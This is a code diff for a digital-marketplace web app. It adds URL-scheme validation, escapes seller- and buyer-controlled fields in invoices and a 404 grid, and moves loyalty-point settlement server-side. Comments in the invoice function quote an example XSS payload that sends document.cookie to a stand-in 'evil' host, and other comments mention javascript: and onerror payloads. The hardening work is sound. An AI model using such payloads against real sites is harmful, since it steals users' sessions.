@@ -2867,6 +2867,24 @@ function sanitize(str) {
 }
 
 /**
+ * Validate a URL is safe for use in href/src attributes. Blocks the
+ * `javascript:`, `data:`, `vbscript:` and other JS-execution schemes that
+ * DOMPurify's text-mode sanitize() does NOT strip. Returns '#' for unsafe
+ * input so href= still parses but the click goes nowhere.
+ *
+ * Always use this for ANY user-supplied URL in href/src — sellers control
+ * product previewUrl, downloadUrl, and avatar URLs.
+ */
+function safeUrl(u) {
+  if (!u || typeof u !== 'string') return '#';
+  const trimmed = u.trim();
+  // Allow only http(s), mailto, tel, or root-relative paths starting with '/'
+  if (/^(https?:|mailto:|tel:)/i.test(trimmed)) return trimmed;
+  if (/^\/[^\/]/.test(trimmed)) return trimmed; // /?p=abc, /help.html etc. (NOT //evil)
+  return '#';
+}
+
+/**
  * Get reCAPTCHA v3 token and verify server-side via Google Apps Script proxy.
  * Returns true if human (score ≥ 0.5), false if bot, null if service unavailable.
  */
@@ -4384,6 +4402,14 @@ async function submitOrder() {
       }
     }
 
+    // Loyalty: capture the redeem intent on the order doc so the Cloud
+    // Function can settle it atomically (balance check + deduct) at approval
+    // time. The client cannot deduct directly — rules block writes to
+    // /users.loyaltyPoints — which was previously letting buyers claim the
+    // discount without ever spending the points.
+    const pointsRedeemed = (typeof _redeemingPoints !== 'undefined' && _redeemingPoints
+                            && _redeemPointsCount > 0) ? _redeemPointsCount : 0;
+
     const orderRef = await db.collection('orders').add({
       buyerId:       curUser.uid,
       buyerEmail:    sanitize(curUser.email || ''),
@@ -4393,6 +4419,7 @@ async function submitOrder() {
       subtotal,
       discount,
       total,
+      pointsRedeemed,
       couponCode:    _appliedCoupon?.code || null,
       proof:         proofStorageUrl,
       paymentMethod: payMethod,
@@ -8372,34 +8399,26 @@ function togglePointsRedeem(checked) {
   renderCheckoutSummary(); // refresh displayed total immediately
 }
 
-/** Award points after a successful purchase */
-async function awardLoyaltyPoints(buyerId, amountEGP) {
-  if (!buyerId || !amountEGP) return;
-  const pts = Math.floor(amountEGP * POINTS_PER_EGP);
-  if (pts <= 0) return;
-  try {
-    await db.collection('users').doc(buyerId).update({
-      loyaltyPoints: FV.increment(pts)
-    });
-    // Log transaction
-    await db.collection('users').doc(buyerId).collection('pointsLog').add({
-      type: 'earn', pts, reason: `Purchase EGP ${amountEGP}`, createdAt: FV.serverTimestamp()
-    });
-    showToast(`🎉 You earned ${pts} loyalty points!`, 'success', 4000);
-  } catch (e) { console.warn('awardLoyaltyPoints:', e); }
+/**
+ * Loyalty points: BACKEND-SETTLED.
+ *
+ * Both award and deduct are now handled by the `onOrderStatusChange` Cloud
+ * Function at order-approval time, inside a Firestore transaction that
+ * verifies the buyer's balance is sufficient before deducting. This closes
+ * a double-spend hole where two parallel checkouts could each redeem the
+ * full balance because the client didn't transactional-check.
+ *
+ * These client-side stubs remain as no-ops so existing patched callers
+ * (submitOrder patches at 8725) don't crash; the source of truth is the
+ * `pointsRedeemed` field stored on the order doc at submission time.
+ */
+async function awardLoyaltyPoints(_buyerId, _amountEGP) {
+  // No-op. Backend awards via onOrderStatusChange on approval. Toast still
+  // shown at approval-confirmation time via the order-status listener.
 }
 
-/** Deduct redeemed points after order */
-async function deductRedeemedPoints(buyerId, ptsUsed) {
-  if (!buyerId || !ptsUsed) return;
-  try {
-    await db.collection('users').doc(buyerId).update({
-      loyaltyPoints: FV.increment(-ptsUsed)
-    });
-    await db.collection('users').doc(buyerId).collection('pointsLog').add({
-      type: 'redeem', pts: -ptsUsed, reason: 'Redeemed for discount', createdAt: FV.serverTimestamp()
-    });
-  } catch {}
+async function deductRedeemedPoints(_buyerId, _ptsUsed) {
+  // No-op. Order doc carries `pointsRedeemed`; CF settles atomically.
 }
 
 // Patch openCheckout to load loyalty points
@@ -8934,14 +8953,24 @@ function printOrderInvoice(orderId) {
 }
 
 function _renderInvoice(orderId, o) {
+  // XSS: invoice is rendered into a popup that inherits the parent origin via
+  // window.opener. Sellers control product names, buyer-supplied data fills
+  // buyerName/paymentMethod/referenceNum — ALL must be sanitized before injection,
+  // otherwise a crafted product name with `<script>fetch('//evil/'+document.cookie)`
+  // exfiltrates the buyer's session when they print the invoice.
   const date  = o.createdAt?.toDate ? o.createdAt.toDate().toLocaleDateString('en-EG') : new Date().toLocaleDateString();
+  const safeOrderId = sanitize(String(orderId || '').slice(0,8).toUpperCase());
   const items = (o.items || []).map(i =>
-    `<tr><td style="padding:0.5rem;border-bottom:1px solid #eee;">${i.name||''}</td>
+    `<tr><td style="padding:0.5rem;border-bottom:1px solid #eee;">${sanitize(i.name || '')}</td>
          <td style="padding:0.5rem;border-bottom:1px solid #eee;text-align:right;">EGP ${Number(i.price||0).toLocaleString()}</td></tr>`
   ).join('');
+  const status = sanitize(o.status || 'pending');
   const statusColor = o.status === 'approved' ? '#10b981' : o.status === 'pending' ? '#f59e0b' : '#ef4444';
+  const buyer       = sanitize(o.buyerName || o.buyerEmail || '—');
+  const paymentMeth = sanitize(o.paymentMethod || '—');
+  const refNum      = o.referenceNum ? sanitize(o.referenceNum) : '';
   const html = `<!DOCTYPE html><html><head><meta charset="UTF-8">
-  <title>Invoice #${orderId.slice(0,8).toUpperCase()}</title>
+  <title>Invoice #${safeOrderId}</title>
   <style>body{font-family:Arial,sans-serif;max-width:600px;margin:40px auto;color:#333;}
   h1{color:#6366f1;}table{width:100%;border-collapse:collapse;margin-bottom:1rem;}
   th{background:#6366f1;color:#fff;padding:0.5rem;text-align:left;}
@@ -8952,13 +8981,13 @@ function _renderInvoice(orderId, o) {
     <span style="font-size:1.8rem;">🛒</span><h1 style="margin:0;">DigitalMarket</h1>
   </div>
   <h2 style="margin:0 0 0.25rem;">TAX INVOICE</h2>
-  <p style="margin:0;color:#666;font-size:0.85rem;">#${orderId.slice(0,8).toUpperCase()}</p>
+  <p style="margin:0;color:#666;font-size:0.85rem;">#${safeOrderId}</p>
   <div style="display:flex;justify-content:space-between;margin:1.25rem 0;font-size:0.85rem;">
-    <div><strong>Date:</strong> ${date}<br>
-         <strong>Buyer:</strong> ${o.buyerName || o.buyerEmail || '—'}<br>
-         <strong>Payment:</strong> ${o.paymentMethod || '—'}</div>
-    <div style="text-align:right;"><strong>Status:</strong> <span style="background:${statusColor};color:#fff;padding:0.2rem 0.5rem;border-radius:4px;">${o.status||'pending'}</span>
-         ${o.referenceNum ? `<br><strong>Ref:</strong> ${o.referenceNum}` : ''}</div>
+    <div><strong>Date:</strong> ${sanitize(date)}<br>
+         <strong>Buyer:</strong> ${buyer}<br>
+         <strong>Payment:</strong> ${paymentMeth}</div>
+    <div style="text-align:right;"><strong>Status:</strong> <span style="background:${statusColor};color:#fff;padding:0.2rem 0.5rem;border-radius:4px;">${status}</span>
+         ${refNum ? `<br><strong>Ref:</strong> ${refNum}` : ''}</div>
   </div>
   <table><thead><tr><th>Item</th><th style="text-align:right;">Price</th></tr></thead><tbody>${items}
   ${o.discount ? `<tr><td style="padding:0.5rem;color:#10b981;">Discount Applied</td><td style="padding:0.5rem;text-align:right;color:#10b981;">-EGP ${Number(o.discount).toLocaleString()}</td></tr>` : ''}
@@ -8968,7 +8997,9 @@ function _renderInvoice(orderId, o) {
   <p>This is a computer-generated invoice.</p></div>
   <script>window.onload=()=>setTimeout(()=>window.print(),400);<\/script>
   </body></html>`;
-  const win = window.open('', '_blank');
+  // Use rel=noopener equivalent: open with noopener so the popup can't reach
+  // window.opener even if a payload slipped through.
+  const win = window.open('', '_blank', 'noopener,noreferrer');
   if (!win) { toast('Allow pop-ups to print invoices.', 'warning'); return; }
   win.document.write(html);
   win.document.close();
@@ -9365,11 +9396,15 @@ function showProductPreview(productId) {
   const isImg = /\.(jpe?g|png|gif|webp|svg)$/i.test(url);
   const isPdf = /\.pdf$/i.test(url) || p.previewUrl.includes('pdf');
   let media = '';
-  if (isVid)      media = `<video controls controlsList="nodownload" style="width:100%;max-height:300px;border-radius:var(--radius);"><source src="${url}">Video not supported.</video>`;
-  else if (isAud) media = `<audio controls controlsList="nodownload" style="width:100%;"><source src="${url}">Audio not supported.</audio>`;
-  else if (isPdf) media = `<iframe src="${url}#toolbar=0&navpanes=0" style="width:100%;height:340px;border:none;border-radius:var(--radius);"></iframe>`;
-  else if (isImg) media = `<img src="${url}" alt="Preview" style="width:100%;max-height:340px;object-fit:contain;border-radius:var(--radius);">`;
-  else            media = `<a href="${url}" target="_blank" rel="noopener" class="btn btn-outline">Open Preview File</a>`;
+  // XSS: validate the URL scheme before injecting. Sellers control previewUrl,
+  // so `javascript:alert(...)` here would otherwise be a one-click account takeover
+  // (in iframe src or <a href>). DOMPurify text-mode does NOT strip URL schemes.
+  const safeMediaUrl = safeUrl(url);
+  if (isVid)      media = `<video controls controlsList="nodownload" style="width:100%;max-height:300px;border-radius:var(--radius);"><source src="${safeMediaUrl}">Video not supported.</video>`;
+  else if (isAud) media = `<audio controls controlsList="nodownload" style="width:100%;"><source src="${safeMediaUrl}">Audio not supported.</audio>`;
+  else if (isPdf) media = `<iframe src="${safeMediaUrl}#toolbar=0&navpanes=0" style="width:100%;height:340px;border:none;border-radius:var(--radius);"></iframe>`;
+  else if (isImg) media = `<img src="${safeMediaUrl}" alt="Preview" style="width:100%;max-height:340px;object-fit:contain;border-radius:var(--radius);">`;
+  else            media = `<a href="${safeMediaUrl}" target="_blank" rel="noopener noreferrer" class="btn btn-outline">Open Preview File</a>`;
 
   document.getElementById('dm-preview-modal')?.remove();
   const el = document.createElement('div');
@@ -10882,11 +10917,14 @@ const DM_CACHE_TTL = 5 * 60 * 1000; // 5 minutes
         .then(snap => {
           const grid = document.getElementById('dm-404-grid');
           if (!grid) return;
+          // XSS: sellers control product name + emoji. The 404 "popular products"
+          // grid was rendering both unsanitized — `<img onerror=...>` in a name
+          // would fire on every 404 page view.
           grid.innerHTML = snap.docs.map(d => {
             const p = d.data();
-            return `<a href="/?p=${d.id}" style="background:#f3f4f6;padding:0.6rem;border-radius:8px;text-decoration:none;color:inherit;">
-              <div style="font-size:2rem;">${p.emoji||'📦'}</div>
-              <div style="font-size:0.78rem;font-weight:600;margin-top:0.25rem;">${(p.name||'').slice(0,30)}</div>
+            return `<a href="/?p=${encodeURIComponent(d.id)}" style="background:#f3f4f6;padding:0.6rem;border-radius:8px;text-decoration:none;color:inherit;">
+              <div style="font-size:2rem;">${sanitize(p.emoji || '📦')}</div>
+              <div style="font-size:0.78rem;font-weight:600;margin-top:0.25rem;">${sanitize((p.name || '').slice(0, 30))}</div>
             </a>`;
           }).join('');
         });
